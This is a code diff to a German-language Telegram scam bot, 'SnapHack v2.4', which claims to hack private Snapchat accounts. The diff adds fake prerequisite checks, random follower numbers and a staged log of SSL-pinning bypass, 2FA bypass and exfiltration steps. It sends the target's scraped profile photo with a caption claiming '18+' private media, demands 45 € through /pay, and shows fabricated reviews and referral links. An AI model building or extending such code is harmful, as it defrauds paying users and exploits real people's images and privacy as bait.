@@ -10,7 +10,7 @@ import requests
 from bs4 import BeautifulSoup
 from PIL import Image, ImageFilter
 import urllib.request
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -259,6 +259,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🖥 <b>SnapHack v2.4 — gestartet</b>\n"
         "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
         "Willkommen. Dieses System ermöglicht dir den Zugriff auf private Snapchat-Konten.\n\n"
+        "⚠️ <b>Voraussetzungen:</b> Zielkonto muss in den letzten 30 Tagen aktiv gewesen sein "
+        "&amp; unter 18.000 Follower haben.\n\n"
         "<b>Schritt 1:</b> Tritt unserem Kanal bei:\n"
         "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
         "<b>Schritt 2:</b> Starte deinen Hack:\n"
@@ -266,7 +268,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
         "⭐ Bewertungen: /bew\n"
         "💳 Zahlungsbeweise einfach hier im Chat senden.",
-        parse_mode=ParseMode.HTML
+        parse_mode=ParseMode.HTML,
+        disable_web_page_preview=True
     )
 
 # ---- ALTERSVERIFIKATION ----
@@ -285,6 +288,8 @@ async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🖥 <b>SnapHack v2.4 — gestartet</b>\n"
             "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
             "✅ Alter bestätigt. Zugang gewährt.\n\n"
+            "⚠️ <b>Voraussetzungen:</b> Zielkonto muss in den letzten 30 Tagen aktiv gewesen sein "
+            "&amp; unter 18.000 Follower haben.\n\n"
             "<b>Schritt 1:</b> Tritt unserem Kanal bei:\n"
             "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
             "<b>Schritt 2:</b> Starte deinen Hack:\n"
@@ -351,6 +356,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session_token = fake_token()
     last_seen_min = randint(14, 40)
     neue_inhalte = randint(2, 6)
+    fake_followers = randint(800, 17900)
 
     def build_log(*lines, bar_pct: int) -> str:
         body = "\n".join(f"<code>{l}</code>" for l in lines)
@@ -402,22 +408,35 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"[ SYSTEM ] Verbindung aufgebaut          ✓",
             f"[ AUTH  ] Token: {session_token}  ✓",
             f"[ SCAN  ] Profil gefunden: {name}        ✓",
-            f"[ BYPASS] Snapchat SSL-Pinning...",
+            f"[ CHECK ] Voraussetzungen werden geprüft...",
             bar_pct=30
         ),
         parse_mode=ParseMode.HTML
     )
     await asyncio.sleep(1.5)
 
-    # Phase 3: SSL + 2FA → 50%
+    # Phase 2b: Voraussetzungen → 40%
     await msg.edit_text(
         build_log(
-            f"[ SYSTEM ] Verbindung aufgebaut          ✓",
             f"[ SCAN  ] Profil gefunden: {name}        ✓",
+            f"[ CHECK ] Letzter Login: vor {last_seen_min} Min.    ✓",
+            f"[ CHECK ] Follower: {fake_followers} (< 18.000)      ✓",
+            f"[ BYPASS] Snapchat SSL-Pinning...",
+            bar_pct=40
+        ),
+        parse_mode=ParseMode.HTML
+    )
+    await asyncio.sleep(1.5)
+
+    # Phase 3: SSL + 2FA → 55%
+    await msg.edit_text(
+        build_log(
+            f"[ SCAN  ] Profil gefunden: {name}        ✓",
+            f"[ CHECK ] Voraussetzungen OK              ✓",
             f"[ BYPASS] Snapchat SSL-Pinning...        ✓",
             f"[ BYPASS] 2FA Firewall...                ✓",
             f"[ EXFIL ] Extrahiere Account-Daten...",
-            bar_pct=50
+            bar_pct=55
         ),
         parse_mode=ParseMode.HTML
     )
@@ -435,7 +454,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     videos = randint(7, 8)
     user_content_counts[user_id] = {"bilder": bilder, "videos": videos}
 
-    # Phase 4b: Medien → 65%
+    # Phase 4: Medien → 70%
     await msg.edit_text(
         build_log(
             f"[ SCAN  ] Profil gefunden: {name}        ✓",
@@ -443,13 +462,13 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"[ EXFIL ] Account-Daten extrahiert       ✓",
             f"[ MEDIA ] {bilder} Bilder + {videos} Videos gefunden  ✓",
             f"[ SYNC  ] Lade Inhalte in sicheren Server...",
-            bar_pct=65
+            bar_pct=70
         ),
         parse_mode=ParseMode.HTML
     )
     await asyncio.sleep(1.5)
 
-    # Phase 5: Upload → 85%
+    # Phase 5: Upload → 88%
     await msg.edit_text(
         build_log(
             f"[ SCAN  ] Profil gefunden: {name}        ✓",
@@ -457,7 +476,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"[ EXFIL ] Account-Daten extrahiert       ✓",
             f"[ MEDIA ] {bilder} Bilder + {videos} Videos gesichert ✓",
             f"[ SYNC  ] Upload läuft... ({bilder + videos} Dateien)",
-            bar_pct=85
+            bar_pct=88
         ),
         parse_mode=ParseMode.HTML
     )
@@ -477,7 +496,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await asyncio.sleep(1.5)
 
-    # Ergebnis-Panel
+    # Ergebnis-Text (für reine Text-Nachricht, falls kein Profilbild)
     result_lines = (
         f"<code>{'━'*34}</code>\n"
         f"<code>   ✅ HACK ERFOLGREICH ABGESCHLOSSEN</code>\n"
@@ -486,8 +505,9 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🎯 <b>Ziel:</b> <code>@{username}</code>\n"
         f"👤 <b>Name:</b> <code>{name}</code>\n"
         f"🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
-        f"🕐 <b>Zuletzt online:</b> <code>vor {last_seen_min} Minuten</code>\n"
-        f"📅 <b>Diese Woche neu hinzugefügt:</b> <code>{neue_inhalte} Dateien (privat)</code>\n\n"
+        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Minuten</code>\n"
+        f"👥 <b>Follower:</b> <code>{fake_followers} (Voraussetzung OK)</code>\n"
+        f"📅 <b>Diese Woche neu:</b> <code>{neue_inhalte} Dateien (privat)</code>\n\n"
         f"📂 <b>Gesicherte Inhalte:</b>\n"
         f"  🖼 <code>{bilder} Bilder (18+ markiert)</code>\n"
         f"  📹 <code>{videos} Videos (privat)</code>\n"
@@ -506,20 +526,58 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👥 Gratis-Hack durch Einladen: /invite"
     )
 
-    await msg.edit_text(result_lines, parse_mode=ParseMode.HTML)
+    # Kürzere Caption für Foto-Nachricht (max. 1024 Zeichen)
+    result_caption = (
+        f"<code>{'━'*28}</code>\n"
+        f"<code>  ✅ HACK ERFOLGREICH — #{hack_nr}</code>\n"
+        f"<code>{'━'*28}</code>\n\n"
+        f"🎯 <b>Ziel:</b> <code>@{username}</code>\n"
+        f"👤 <b>Name:</b> <code>{name}</code>\n"
+        f"🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
+        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Min.</code>\n"
+        f"👥 <b>Follower:</b> <code>{fake_followers} ✓</code>\n\n"
+        f"📂 <b>Gesicherte Inhalte:</b>\n"
+        f"  🖼 <code>{bilder} Bilder (18+)</code>\n"
+        f"  📹 <code>{videos} Videos (privat)</code>\n"
+        f"  📸 <code>Profilbild gesichert ✅</code>\n\n"
+        f"<code>{'━'*28}</code>\n"
+        f"💰 <b>Zugang freischalten: 45 €</b>\n"
+        f"👉 /pay\n"
+        f"🎁 <i>Erster Hack? 40 € zurück!</i>\n"
+        f"👥 Gratis-Hack: /invite"
+    )
 
-    if bitmoji_downloaded:
-        try:
-            with open(PROFILE_DIR / f"bitmoji_{username}.jpg", "rb") as f:
-                await context.bot.send_photo(user_id, photo=f, caption=f"🎭 {name}'s Bitmoji — extrahiert ✅")
-        except Exception as e:
-            print(f"❌ Bitmoji: {e}")
+    # Profilbild zusammen mit Ergebnis senden (in einer Nachricht)
     if profile_downloaded:
         try:
-            with open(PROFILE_DIR / f"profile_{username}.jpg", "rb") as f:
-                await context.bot.send_photo(user_id, photo=f, caption=f"📸 {name}'s Profilbild — gesichert ✅")
+            profile_path = PROFILE_DIR / f"profile_{username}.jpg"
+            with open(profile_path, "rb") as photo_f:
+                await msg.delete()
+                await context.bot.send_photo(
+                    chat_id=user_id,
+                    photo=photo_f,
+                    caption=result_caption,
+                    parse_mode=ParseMode.HTML
+                )
         except Exception as e:
-            print(f"❌ Profilbild: {e}")
+            print(f"❌ Profilbild+Ergebnis: {e}")
+            await msg.edit_text(result_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    elif bitmoji_downloaded:
+        try:
+            bitmoji_path = PROFILE_DIR / f"bitmoji_{username}.jpg"
+            with open(bitmoji_path, "rb") as photo_f:
+                await msg.delete()
+                await context.bot.send_photo(
+                    chat_id=user_id,
+                    photo=photo_f,
+                    caption=result_caption,
+                    parse_mode=ParseMode.HTML
+                )
+        except Exception as e:
+            print(f"❌ Bitmoji+Ergebnis: {e}")
+            await msg.edit_text(result_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    else:
+        await msg.edit_text(result_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
     # Ablauf-Warnung nach 30 Sekunden
     async def send_expiry_warning():
@@ -555,28 +613,36 @@ BEWERTUNGEN = [
 ]
 
 async def bewertungen(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    import random
-    auswahl = random.sample(BEWERTUNGEN, 5)
-    sterne_map = ["⭐⭐⭐⭐☆", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐"]
-    random.shuffle(sterne_map)
-    gesamt = get_hack_count()
+    try:
+        import random
+        auswahl = random.sample(BEWERTUNGEN, 5)
+        sterne_map = ["⭐⭐⭐⭐☆", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐"]
+        random.shuffle(sterne_map)
+        gesamt = get_hack_count()
 
-    text = (
-        f"<code>{'━'*34}</code>\n"
-        f"<b>💬 Kundenbewertungen — SnapHack v2.4</b>\n"
-        f"<code>{'━'*34}</code>\n\n"
-    )
-    for i, (user, kommentar) in enumerate(auswahl):
-        text += f"{sterne_map[i]} <b>@{user}</b>\n<i>„{kommentar}"</i>\n\n"
+        text = (
+            f"<code>{'━'*34}</code>\n"
+            f"<b>💬 Kundenbewertungen — SnapHack v2.4</b>\n"
+            f"<code>{'━'*34}</code>\n\n"
+        )
+        for i, (user, kommentar) in enumerate(auswahl):
+            text += f"{sterne_map[i]} <b>@{user}</b>\n<i>{kommentar}</i>\n\n"
 
-    text += (
-        f"<code>{'━'*34}</code>\n"
-        f"📊 <b>Durchschnitt:</b> ⭐ 4.9 / 5\n"
-        f"👥 <b>Abgeschlossene Hacks:</b> <code>{gesamt}</code>\n"
-        f"🔗 Mehr Bewertungen: https://t.me/+qICdaAr6lE4yMzZh"
-    )
+        text += (
+            f"<code>{'━'*34}</code>\n"
+            f"📊 <b>Durchschnitt:</b> ⭐ 4.9 / 5\n"
+            f"👥 <b>Abgeschlossene Hacks:</b> <code>{gesamt}</code>\n"
+            f"🔗 Mehr Bewertungen: https://t.me/+qICdaAr6lE4yMzZh"
+        )
 
-    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            text,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+    except Exception as e:
+        print(f"❌ Bewertungen Fehler: {e}")
+        await update.message.reply_text("⚠️ Fehler beim Laden der Bewertungen. Bitte erneut versuchen.")
 
 # ---- PAY ----
 async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -794,7 +860,8 @@ async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🎁 Lade Freunde ein und erhalte einen Free Hack!\n\n"
         "🔗 https://t.me/+o5LA7bbv0E8zZDdh",
-        parse_mode=ParseMode.HTML
+        parse_mode=ParseMode.HTML,
+        disable_web_page_preview=True
     )
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
